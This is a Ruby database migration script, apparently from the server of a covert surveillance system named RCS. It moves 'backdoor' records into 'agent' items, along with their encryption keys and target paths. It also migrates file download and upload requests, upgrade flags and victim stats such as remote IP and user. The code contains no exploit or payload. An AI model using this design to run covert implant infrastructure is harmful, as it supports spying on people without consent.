require_relative '../db_layer'
require_relative '../grid'

module RCS
module DB

class BackdoorMigration
  extend Tracer
  
  def self.migrate(verbose)

    @higher_build = 0
    
    print "Migrating backdoors to agents "

    # check if there is already a global document
    global = ::Item.where({_kind: 'global'}).first
    global = ::Item.new({_kind: 'global', counter: 0}) if global.nil?
    
    backdoors = DB.instance.mysql_query('SELECT * from `backdoor` ORDER BY `backdoor_id`;').to_a
    backdoors.each do |backdoor|
      
      # is this a backdoor or a factory?!?!
      kind = (backdoor[:class] == 0) ? 'agent' : 'factory'
      
      # skip item if already migrated
      next if Item.count(conditions: {_mid: backdoor[:backdoor_id], _kind: kind}) != 0

      # check that the agent instance really exists (do not migrate dumb (1) placeholders)
      next if backdoor[:instance].empty? and kind == 'agent'

      trace :info, "Migrating backdoor '#{backdoor[:backdoor]}'." if verbose
      print (backdoor[:deleted] == 1) ? "+" : "." unless verbose

      mb = ::Item.new
      mb[:_mid] = backdoor[:backdoor_id]
      mb.name = backdoor[:backdoor]
      mb.desc = backdoor[:desc]
      mb._kind = kind
      mb.status = backdoor[:status].downcase
      mb.demo = false
      
      mb.ident = backdoor[:build]
      build_no = backdoor[:build].sub("RCS_", "").to_i
      global.counter = build_no if build_no > global.counter


      mb.instance = backdoor[:instance].downcase if kind == 'agent'
      mb.version = backdoor[:version].to_i if kind == 'agent'
      
      mb.logkey = backdoor[:logkey]
      mb.confkey = backdoor[:confkey]
      mb.type = backdoor[:type].downcase
      
      if kind == 'agent'
        mb.platform = backdoor[:subtype].downcase
        mb.platform = 'windows' if ['win32', 'win64'].include? mb.platform
        mb.platform = 'ios' if mb.platform == 'iphone'
        mb.platform = 'osx' if mb.platform == 'macos'
        mb.platform = 'winmo' if mb.platform == 'winmobile'
      end
      
      mb.deleted = (backdoor[:deleted] == 0) ? false : true
      mb.uninstalled = (backdoor[:uninstalled] == 0) ? false : true if kind == 'agent'
      
      mb.counter = backdoor[:counter] if kind == 'factory'
      
      mb.seed = backdoor[:pathseed]
      
      mb.stat = Stat.new
      mb.stat.evidence = {}
      mb.stat.size = 0
      mb.stat.grid_size = 0
      
      target = Item.where({_mid: backdoor[:target_id], _kind: 'target'}).first
      mb.path = target[:path] + [ target[:_id] ]
      
      mb.save
      
    end
    
    global.save
    puts " done."
    #puts " done, higher build number is #{global.counter}."
    
  end
  
  def self.migrate_associations(verbose)
    # filesystems
    
    print "Migrating filesystems "
    
    filesystems = DB.instance.mysql_query('SELECT * from `filesystem` ORDER BY `filesystem_id`;').to_a
    filesystems.each do |fs|
      agent = Item.where({_mid: fs[:backdoor_id], _kind: 'agent'}).first
      next if agent.nil?
      begin
        agent.filesystem_requests.create!(path: fs[:path], depth: fs[:depth])
      rescue Mongoid::Errors::Validations => e
        next
      end
      print "." unless verbose
    end
    
    puts " done."
    
    # downloads

    print "Migrating downloads "

    downloads = DB.instance.mysql_query('SELECT * from `download` ORDER BY `download_id`;').to_a
    downloads.each do |dw|
      agent = Item.where({_mid: dw[:backdoor_id], _kind: 'agent'}).first
      next if agent.nil?
      begin
        agent.download_requests.create!(path: dw[:filename])
      rescue Mongoid::Errors::Validations => e
        next
      end
      print "." unless verbose
    end

    puts " done."

    # upgrades

    print "Migrating upgrades "

    upgrades = DB.instance.mysql_query('SELECT * from `upgrade` ORDER BY `upgrade_id`;').to_a
    upgrades.each do |ug|
      agent = Item.where({_mid: ug[:backdoor_id], _kind: 'agent'}).first
      next if agent.nil?

      next if agent.upgradable == true

      print "." unless verbose

      agent.upgradable = true
      agent.save
    end
    
    puts " done."
    
    # uploads
    
    print "Migrating uploads "

    stats = DB.instance.mysql_query('SELECT * from `upload` ORDER BY `upload_id`;').to_a
    stats.each do |up|
      agent = Item.where({_mid: up[:backdoor_id], _kind: 'agent'}).first
      next if agent.nil?
      begin
        upload = agent.upload_requests.create!(filename: up[:filename])
        upload[:_grid] = [ GridFS.put(up[:content], {filename: up[:filename]}) ]
        upload.save
      rescue Mongoid::Errors::Validations => e
        next
      end
      
      print "." unless verbose
    end
    
    puts " done."

    # stats
    
    print "Migrating stats "

    stats= DB.instance.mysql_query('SELECT * from `stat` ORDER BY `backdoor_id`;').to_a
    stats.each do |st|
      agent = Item.where({_mid: st[:backdoor_id], _kind: 'agent'}).first
      next if agent.nil?

      next unless agent.stat.nil? or agent.stat.source.nil?

      print "." unless verbose

      ms = ::Stat.new
      ms.source = st[:remoteip]
      ms.user = st[:remoteuser]
      ms.device = st[:remotehost]
      ms.last_sync = st[:received].to_i unless st[:received].nil?
      ms.evidence = {}
      ms.size = 0
      ms.grid_size = 0

      agent.stat = ms

      agent.save
    end

    puts " done."

  end
end

end # ::DB
end # ::RCS
